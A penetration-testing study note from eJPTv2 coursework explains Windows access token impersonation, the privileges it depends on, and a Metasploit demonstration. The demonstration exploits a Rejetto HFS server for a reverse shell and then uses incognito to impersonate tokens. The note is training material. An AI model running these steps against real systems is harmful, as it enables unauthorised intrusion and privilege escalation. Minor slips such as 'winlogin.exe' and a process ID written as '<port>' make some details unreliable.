---
up: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/System - Host Based Attacks/Windows Privilege Escalation/Windows Privilege Escalation]]"
---

# Access Token Impersonation

## Windows Access Tokens

- Core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS)
- a WAT is responsible for identifying and describing the security context of a process or thread running on a system
- Generated by the ``winlogin.exe`` process every time a user authenticates
- Includes the identity and privileges of the user account associated with the thread or process
- The token is then attached to every child processes created by a user (`userinit.exe`)

- Security levels are assigned to token
	- **Impersonate**: created as a direct result of a non-interactive login
		- Can only be used on the local system
	- **Delegate**: typically created through an interactive login
		- Can be used on any system

## Windows Privileges

- Impersonating access tokens to elevate privileges on a system will depend on the target account privileges
- Required privileges for successful attack:
	- `SeAssignPrimaryToken`
		- Allows a user to impersonate tokens
	- `SeCreateToken`
		- allows to create an arbitrary token with admin privileges
	- `SeImpersonatePrivilege`
		- Allows to create a process under the security context of another user

## Incognito Module

- Meterpreter module to impersonate user tokens
- Used to display a list of available token to impersonate

## Demonstration

Target runs a vulnerable `rejetto` version

```bash
> use exploit/windows/http/rejetto_hfs_exec
> set LHOST <my_ip>
> set LPORT
> set RHOSTS $TRG
```

```bash
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "<token>"
meterpreter > pgrep explorer
<port>
meterpreter > migrate <port>
meterpreter > getprivs
```

If no Delegation or Impersonation tokens are available the potato technique will need to be used.

It will generate an administrator token and let you impersonate it.
